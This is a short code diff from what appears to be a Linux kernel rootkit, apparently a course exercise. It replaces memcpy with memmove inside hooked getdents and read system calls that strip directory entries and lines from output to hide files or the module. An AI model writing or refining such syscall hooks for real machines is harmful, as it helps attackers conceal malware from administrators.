@@ -71,7 +71,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
       void *end = (void *)dirp + byteNum;
       void *curEnd = (void *)curDirp + curDirp->d_reclen;
       size_t num = (size_t)(end - curEnd);
-      memcpy(curDirp, (void *)curDirp + curDirp->d_reclen, num); 
+      memmove(curDirp, (void *)curDirp + curDirp->d_reclen, num); 
       byteNum = byteNum - curDirp->d_reclen;
       continue;
     }
@@ -88,7 +88,7 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
   if (pos == NULL) { return num; }
   void *end = strnstr(pos, "\n", num - (pos - buf));
   if (end == NULL) { return num; }
-  memcpy(pos, end + 1, num - (pos - buf) - (end + 1 - pos));
+  memmove(pos, end + 1, num - (pos - buf) - (end + 1 - pos));
   num = num - (end + 1 - pos);
   return num;
 }
